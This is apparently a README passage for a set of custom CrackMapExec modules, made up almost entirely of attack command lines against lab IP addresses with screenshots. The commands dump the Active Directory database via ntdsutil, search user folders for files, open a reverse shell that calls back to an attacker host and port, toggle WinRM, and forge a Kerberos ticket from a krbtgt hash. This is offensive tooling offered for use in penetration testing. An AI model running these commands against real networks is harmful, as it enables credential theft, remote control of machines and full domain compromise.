## Usage of ntdsutil

````console
crackmapexec smb 192.168.163.144 -u 'Admin2' -p 'Password!' -M ntdsutil
````

![image](https://github.com/e1abrador/Crackmapexec-custom-modules/assets/74373745/6543c537-cada-4c08-a8b2-3c82757bee22)


## Usage of file_discovery

````console
crackmapexec smb 192.168.163.144 -u 'Admin2' -p 'Password!' -M file_discovery -o SEARCH_PATH=C:\\Users
````

![image](https://github.com/e1abrador/Crackmapexec-custom-modules/assets/74373745/550cfa76-d5ad-4d49-99ba-4fd0f052c98f)


## Usage of revshell

````console
crackmapexec smb 192.168.163.144 -u 'Admin2' -p 'Password!' -M reverse_shell -o LHOST=192.168.163.136 LPORT=1234 HTTP_SERVER=8443
````

![image](https://github.com/e1abrador/Crackmapexec-custom-modules/assets/74373745/a32ac96e-ead0-41fd-a68a-9c7abdafbcd1)


## Usage of winrm

````console
crackmapexec smb 192.168.163.142 -u Admin2 -p 'Password123!' -M winrm -o ACTION=ENABLE
crackmapexec smb 192.168.163.142 -u Admin2 -p 'Password123!' -M winrm -o ACTION=DISABLE
````

![image](https://github.com/e1abrador/Crackmapexec-custom-modules/assets/74373745/2159d3f7-e8d5-4e7b-83a6-d70f9d298aec)


## Usage of gettgt

````console
crackmapexec smb 192.168.246.139 -u subadmin -p Password123\! -M gettgt -o KRBTGT_NTLM=70a415ccf57e2a3c781764a3b1beee95 TARGET_USER=Administrador
````

![image](https://github.com/e1abrador/Crackmapexec-custom-modules/assets/74373745/ef907956-5380-4d6a-baa2-fb5500468985)

